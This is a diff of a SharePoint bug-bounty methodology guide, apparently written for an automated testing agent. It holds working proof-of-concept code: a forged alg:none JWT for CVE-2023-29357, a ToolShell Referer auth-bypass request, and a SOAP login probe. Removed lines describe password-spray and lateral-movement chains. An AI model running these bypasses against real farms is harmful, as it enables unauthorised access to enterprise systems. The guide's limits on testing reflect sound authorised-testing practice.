@@ -17,7 +17,7 @@ SharePoint Server (on-prem) is one of the richest enterprise attack surfaces in 
 
 - **SP2013 farms still on the public internet** — every CVE since April 2023 is unpatched. Critical-severity findings.
 - **Dealer / partner / supplier portals** built on SharePoint by enterprise integrators (German VW group, a enterprise system integrator, etc.) — high-impact business data, often nested inside corporate AD trees.
-- **SharePoint farms with anonymous Forms-auth zones** — Authentication.asmx becomes anonymously brute-forceable.
+- **SharePoint farms with anonymous Forms-auth zones** — `Authentication.asmx` is an anonymous credential oracle. Classify the limiter (≤10 synthetic failures). Do not spray passwords.
 - **SharePoint inside corporate AD parent forests** — NTLM Type-2 leak (see `hunt-ntlm-info`) discloses the parent forest membership.
 - **Telerik-integrated SharePoint installations** — additional deserialization sinks on top of SP's own.
 
@@ -118,11 +118,12 @@ HelpWindowKey('WSSEndUser_troubleshooting                  (anonymous error.aspx
 
    **Map to CVE matrix:**
 
-   | Build | Edition | Status | Notable unpatched-after-EoL CVEs |
-   |---|---|---|---|
-   | `15.0.5545.1000` | SP2013 final CU | **EoL 2023-04-11** | CVE-2023-29357, CVE-2023-33160/33157/36941, CVE-2024-21318/30043/38023/38024/38094, CVE-2025-53770/53771, CVE-2025-29794 |
-   | `16.0.10416.x` | SP2016 | EoL 2026-07-14 | depends on patch level |
-   | `16.0.10417.x+` | SP2019 / SE | active | check Microsoft's monthly Patch Tuesday |
+   | Build | Edition | Status |
+   |---|---|---|
+   | `15.0.*` (final public `15.0.5545.1000`) | SP2013 | **EoL 2023-04-11.** No ToolShell patch was ever issued. CVE-2025-53770/53771 stay unfixed. **CVE-2023-29357 is SharePoint Server 2019** — do not assume it on 2013; prove it with the realm + alg:none body-diff below. |
+   | `16.0.43xx`–`16.0.55xx` (final public around `16.0.5565`) | SP2016 | **EoL 2026-07-14.** ToolShell patches shipped in July 2025, **before** this EoL. Match `LibraryVersion` to the July 2025+ CU. EoL alone is not "ToolShell is present". |
+   | `16.0.103xx`–`16.0.10417.*` | SP2019 | **EoL 2026-07-14.** `16.0.10416` and `16.0.10417` are **both 2019**, not 2016 and not Subscription Edition. Same ToolShell note as 2016. **CVE-2023-29357** (JWT `alg:none`) is this edition — step 3b, pre-June 2023 CU. |
+   | `16.0.14326+`, including `16.0.20xxx` (2026 example `16.0.20326`) | Subscription Edition | Still serviced. Check the current monthly CU before calling a build vulnerable. |
 
 2. **Anonymous-endpoint matrix probe.** Walk every endpoint in the table below in one pass. Anything anonymous becomes part of the attack chain.
 
@@ -140,7 +141,7 @@ HelpWindowKey('WSSEndUser_troubleshooting                  (anonymous error.aspx
    /_layouts/15/ToolPane.aspx?DisplayMode=Edit             → ToolShell precondition (THIS IS THE BIG ONE)
    /_layouts/15/Picker.aspx                                → SafeControl recon (see step 6)
    /_layouts/15/<CustomerName>/pages/login/customlogin.aspx    → custom Forms login (replace `<CustomerName>` with target's customer name)
-   /_vti_bin/Authentication.asmx                           → legacy SOAP login — anonymous brute-force (CRITICAL)
+   /_vti_bin/Authentication.asmx                           → legacy SOAP login oracle — classify the limiter, do not spray (see step 3)
    /_vti_bin/Authentication.asmx?WSDL                      → WSDL — confirms Login + Mode ops
    /_vti_bin/SharedAccess.asmx                             → often anonymous
    /_vti_bin/spsdisco.aspx                                 → SP service discovery
@@ -169,9 +170,34 @@ HelpWindowKey('WSSEndUser_troubleshooting                  (anonymous error.aspx
    # NO password spraying, NO credential stuffing. Prove the missing control and STOP.
    ```
 
-   **Severity:** Critical when anonymous + no rate limit + no lockout. The reportable bug is the *missing rate limit / lockout on an anonymously-reachable credential-validation endpoint* — proven with the <=10-sample probe above. Do NOT attempt to actually guess/crack a credential (hard rule: no brute force).
+   **What you proved:** an anonymous credential oracle and whether a limiter engaged (uniform status/size/timing across ≤10 synthetic failures). That is a missing control. It is **not** ATO and not Critical until `<ErrorCode>NoError</ErrorCode>` plus a `FedAuth` cookie is issued for an account the engagement allows. Do not spray, stuff, or walk real usernames.
 
-4. **ToolShell precondition chain probe** (CVE-2025-53770 class). Three sub-requests:
+3b. **JWT `alg:none` (CVE-2023-29357)** — SharePoint Server **2019** pre-June 2023 CU. Skip unless `LibraryVersion` is 16.0.103xx–16.0.104xx **or** a 401 to `/_api/web/siteusers` already shows `Bearer realm=`. Proof is `/_api/web/currentuser` JSON with a `LoginName` you were not issued. Stop. Do not chain CVE-2023-24955 or drop a DynamicProxy.
+
+   ```bash
+   curl -skD - "https://target.example/_api/web/siteusers" -H "Authorization: Bearer" | grep -i WWW-Authenticate
+   # Bearer realm="<GUID>",client_id="00000003-0000-0ff1-ce00-000000000000"
+   ```
+   ```python
+   import json, base64, time
+   realm, cid = "PASTE_REALM", "00000003-0000-0ff1-ce00-000000000000"
+   now = int(time.time())
+   payload = {"aud": f"{cid}@{realm}", "iss": cid, "nbf": now, "exp": now+3600,
+              "ver": "hashedprooftoken", "nameid": f"{cid}@{realm}",
+              "endpointurl": "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
+              "endpointurlLength": 1, "isloopback": True}
+   b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()
+   tok = b64(b'{"alg":"none"}') + "." + b64(json.dumps(payload).encode()) + ".AAA"
+   print(tok)
+   ```
+   ```bash
+   curl -sk "https://target.example/_api/web/currentuser" -H "Accept: application/json;odata=verbose" \
+     -H "Authorization: Bearer $TOK" -H "X-PROOF_TOKEN: $TOK"
+   # Body-diff vs the same GET with no token (401). LoginName / IsSiteAdmin in JSON = auth bypass.
+   ```
+   `endpointurl` is SHA-256(`h`) base64 with `endpointurlLength=1` (public shortcut; do not invent a different hash). Send the **same** token in both headers.
+
+4. **ToolShell precondition chain probe** (CVE-2025-53770 class). Walk a–d. Stop when one proof lands.
 
    ```bash
    # Sub-step a: anonymous GET on ToolPane.aspx
@@ -190,13 +216,26 @@ HelpWindowKey('WSSEndUser_troubleshooting                  (anonymous error.aspx
      -H "X-RequestDigest: <digest from step b>" \
      --data "MSOSPWebPartManager_DisplayModeName=Browse&MSOTlPn_Button=none"
    # Should return 200 OK — server treats anonymous-with-digest as authorised state-changing POST.
+
+   # Sub-step d: if (a) was 401/403/login, one auth-bypass probe (CVE-2025-49706 / trailing-slash bypass CVE-2025-53771).
+   # Referer is exactly /_layouts/SignOut.aspx (also /_layouts/14/ and /_layouts/15/). DisplayMode=Edit.
+   # The LAST query parameter's value is /ToolPane.aspx. Trailing slash or an extra path segment is the 53771 bypass.
+   # Do not send MSOTlPn_DWP, a CompressedDataTable, or any gadget.
+   curl -sk -D /tmp/tp.hdr -o /tmp/tp.body -X POST \
+     "https://target.example/_layouts/15/ToolPane.aspx/?DisplayMode=Edit&a=/ToolPane.aspx" \
+     -H "Referer: /_layouts/SignOut.aspx" \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     --data "MSOTlPn_Button=none"
+   # Diff /tmp/tp.body against the same POST with no Referer. Editor HTML only on the Referer request = auth bypass.
    ```
 
-   **Severity:** Critical on EoL SP2013 (no patch will ever ship). High on SP2016/2019/SE if `__VIEWSTATEENCRYPTED` is non-empty (encrypted ViewState mitigates the deserialization arm but precondition still warns of misconfig).
+   **Detected vs proven.** Anonymous ToolPane HTML that the same POST **without** the Referer does not return is a proven auth bypass. A FormDigest, `__VIEWSTATEENCRYPTED=""`, or a 200 is a precondition, not RCE. **Proven RCE** is one benign command marker (`hunt-rce` / `hunt-deserialization`), then stop. Do not write `spinstall0.aspx` or any webshell. If that file is already on disk, fetch it read-only as evidence of prior compromise and stop.
+
+   **Severity:** SP2013 (`15.0.*`) never received a ToolShell fix — exposed preconditions there are the public chain, still not "RCE" until the marker. SP2016/2019 received July 2025 patches before their 2026-07-14 EoL, so quote the build. Encrypted ViewState (`__VIEWSTATEENCRYPTED` non-empty) blocks the simple unsigned-ViewState arm; it does not by itself clear the Referer bypass.
 
    **CVE mapping (ToolShell):** the auth-bypass arm is CVE-2025-49706 (crafted `Referer` to ToolPane.aspx) / its bypass CVE-2025-53771; the deserialization arm is CVE-2025-49704 / its bypass CVE-2025-53770. This chain has been mass-exploited in the wild since July 2025 — assume any internet-exposed vulnerable farm may already be compromised, and look for existing web shells (e.g. `spinstall0.aspx` and variants under `_layouts/`) as part of the assessment.
 
-   **IMPORTANT:** Do NOT actually deliver a malicious ViewState payload (hard rule: prove the primitive once, no mass/destructive exploitation). The precondition chain is sufficient evidence for the report. In the real CVE-2025-53770 chain, machineKey recovery is NOT a precondition for RCE: the auth-bypass (CVE-2025-49706, crafted Referer to ToolPane.aspx) + insecure deserialization (CVE-2025-49704) yield an initial web shell with no machineKey knowledge. The `<machineKey>` (ValidationKey/DecryptionKey) is then DUMPED by that web shell and used to forge signed `__VIEWSTATE` for persistent/unauthenticated re-exploitation. So machineKey is the loot of the first RCE and the persistence arm, not a gate in front of it — do not under-assess an exploitable farm just because machineKey is unknown.
+   **IMPORTANT:** Do not deliver a ViewState/gadget payload and do not drop a shell (prove once, no destructive exploitation). machineKey is **not** a gate in front of the first code-execution bug: the public chain is the Referer bypass plus insecure deserialization, and the shell then dumps `<machineKey>` for later forged ViewState. Do not under-assess a farm because machineKey is unknown — and do not upgrade a Referer bypass or an empty `__VIEWSTATEENCRYPTED` into "RCE" without the marker.
 
 5. **NTLM Type-2 AD topology disclosure.** Cross-reference `hunt-ntlm-info` for full methodology. Quick check:
 
@@ -262,7 +301,7 @@ HelpWindowKey('WSSEndUser_troubleshooting                  (anonymous error.aspx
 
 ## Payload & Detection Patterns
 
-**Authentication.asmx Login (the canonical brute-force endpoint):**
+**Authentication.asmx Login (credential oracle — one allowed account, or the ≤10 synthetic limiter probe; never a wordlist):**
 ```xml
 POST /_vti_bin/Authentication.asmx HTTP/1.1
 Host: target.example
@@ -380,15 +419,16 @@ curl -sk "https://target.example/_layouts/15/Picker.aspx?PickerDialogType=Micros
 Before writing the report:
 
 1. **What can the attacker DO right now?**
-   - Authentication.asmx anonymous + no rate limit → **Critical** (unbounded credential validation; password spray + UPN format from NTLM = end-to-end ATO path)
-   - Full ToolShell precondition chain (anon GET + anon FormDigest + anon POST + unencrypted VS) + EoL SP2013 → **Critical** (RCE via well-documented public exploit chain, no patch will ship)
+   - Authentication.asmx anonymous + uniform ≤10-sample timing → **missing lockout** (Medium/High as a control finding). Critical ATO only if a `FedAuth` cookie was actually issued. No spray.
+   - CVE-2023-29357: `/_api/web/currentuser` JSON `LoginName` with the alg:none token, 401 without it → **proven auth bypass**. Admin impersonation if `IsSiteAdmin` is true. Not RCE.
+   - ToolShell Referer bypass that returns editor HTML anonymously → **proven auth bypass**. Add "RCE" only after one benign command marker. Preconditions (FormDigest, empty `__VIEWSTATEENCRYPTED`, SP2013) are the chain's setup, not the proof.
    - NTLM Type-2 AD topology disclosure + default-Windows hostname → **Medium**
    - SP2013 EoL alone → **Medium-Low** (compliance / hygiene; bug-bounty programs vary — some accept, many reject)
    - `download.aspx` URL echo without confirmed Collaborator callback → **NOT SSRF — retract**
 
 2. **Have you reproduced the full chain to attacker-attainable impact?**
-   - For Authentication.asmx: 10-burst test with uniform timing (proves no rate limit) is sufficient. Don't actually crack a credential.
-   - For ToolShell: precondition chain (steps a+b+c) is sufficient. Don't deliver a malicious payload.
+   - For Authentication.asmx: the ≤10 synthetic sample with uniform timing proves the missing limiter. It does not prove a password. Stop there.
+   - For ToolShell: steps a–d prove reachability and, when the Referer changes the body, auth bypass. RCE still needs one benign marker. Do not deliver a gadget or write a webshell.
    - For NTLM: AV-pair decode showing AD-topology fields is sufficient.
 
 3. **Can you reproduce in <10 minutes from a clean shell?**
@@ -406,7 +446,7 @@ Target: `https://target-portal.example/` — SharePoint Server 2013 build `15.0.
 
 11 findings shipped: 3 Critical, 2 Medium, 6 Low/Info. The three Criticals:
 
-1. **Authentication.asmx anonymous credential brute-force** — 10-burst test showed uniform 0.6-0.9 s timing with no rate limit, no lockout, no CAPTCHA, no MFA challenge. Identical 431-byte responses.
+1. **Authentication.asmx anonymous credential oracle, no lockout** — ≤10 synthetic failures, uniform timing, identical failure bodies, no CAPTCHA and no MFA challenge. Report the missing control. ATO was not claimed, because no `FedAuth` was issued.
 2. **HTTP request smuggling TE.CL** — 5/5 trials showed 12.18 s back-end hang vs 0.16 s baseline. 4 additional obfuscation variants (space-before-colon, trailing-space, lowercase, mixed-case) showed 6.16 s hang — each bypassing simple WAF rules.
 3. **ToolShell precondition chain** — anonymous GET ToolPane.aspx (200) + anonymous POST `/_api/contextinfo` (200, valid FormDigest) + anonymous POST ToolPane.aspx with digest (200, no auth challenge) + `__VIEWSTATEENCRYPTED=""`. Permanent zero-day on EoL SP2013.
 
@@ -435,10 +475,10 @@ Same target. Feeding `Microsoft.SharePoint.WebPartPages.DataFormWebPart` (the ca
 
 ## Related Skills & Chains
 
-- **`hunt-auth-bypass`** — Legacy SOAP `/_vti_bin/Authentication.asmx` accepts anonymous Login calls on misconfigured farms. Chain primitive: SharePoint anon SOAP login probe → if response yields cookie or success differential → `hunt-auth-bypass` brute-force matrix (username enumeration via timing, password spray with low-and-slow against the same SOAP endpoint that bypasses ADFS-level lockout) → valid cred → `/_layouts/15/` authenticated surface.
-- **`hunt-ntlm-info`** — Every SharePoint farm advertises `WWW-Authenticate: NTLM` anonymously on `/_vti_bin/`. Chain primitive: SharePoint NTLM Type-2 challenge capture → `hunt-ntlm-info` AV_PAIR decode yields NetBIOS domain + internal DNS forest + DC hostname → feed domain into `m365-entra-attack` ROPC user-enumeration spray on tenant tied to that domain.
+- **`hunt-auth-bypass`** — Legacy SOAP `/_vti_bin/Authentication.asmx` accepts anonymous `Login` calls on misconfigured farms. Chain: one allowed test account, or the ≤10 synthetic limiter sample. A `NoError` + `FedAuth` for that account is the auth bypass. Do not spray passwords and do not walk usernames. NTLM Type-2 domain names are recon for `hunt-ntlm-info`, not a password list. CVE-2023-29357 (`alg:none` JWT → `/_api/web/currentuser` LoginName) is a separate pre-auth bypass on SP2019.
+- **`hunt-ntlm-info`** — Many farms advertise `WWW-Authenticate: NTLM` on `/_vti_bin/`. One Type-1 → Type-2, then `hunt-ntlm-info` decodes NetBIOS domain, DNS forest, and hostname. That disclosure is the finding. Do not spray, ROPC-enumerate, or stuff passwords against the tenant.
 - **`hunt-aspnet`** — SharePoint is ASP.NET Webforms under the covers; ViewState, machineKey, and SafeControl reflection all apply. Chain primitive: SharePoint version disclosure → confirm patch level missing → `hunt-aspnet` ViewState dual-parser MAC-bypass → deserialization gadget → RCE in `w3wp.exe` as farm account.
-- **`hunt-rce`** — ToolShell precondition chain (CVE-2025-53770) is the current high-impact SP RCE path. Chain primitive: ToolShell preconditions met (`/_layouts/15/ToolPane.aspx?DisplayMode=Edit` reachable via the CVE-2025-49706 auth bypass — a crafted `Referer` header pointing at ToolPane.aspx — + version vulnerable) → `hunt-rce` deserialization gadget chain → SYSTEM/farm-account shell → `m365-entra-attack` lateral via stolen on-prem service-account token to Entra-synced identity.
+- **`hunt-rce`** — ToolShell RCE is the Referer bypass (CVE-2025-49706 / CVE-2025-53771) plus deserialization (CVE-2025-49704 / CVE-2025-53770) on a vulnerable build. One benign command marker, then stop. Do not drop `spinstall0.aspx`. A token you did not actually capture is not lateral movement.
 - **`triage-validation`** — SharePoint farms generate a lot of "looks like a finding" hygiene noise (FormDigest issuance, version disclosure, extension blocklist quirks). Chain primitive: run every SP finding through the 7-Question Gate before reporting — most version-disclosure-only findings die at "is this actually exploitable on this farm" without a paired CVE PoC.
 
 ## Before you report — dedup gate
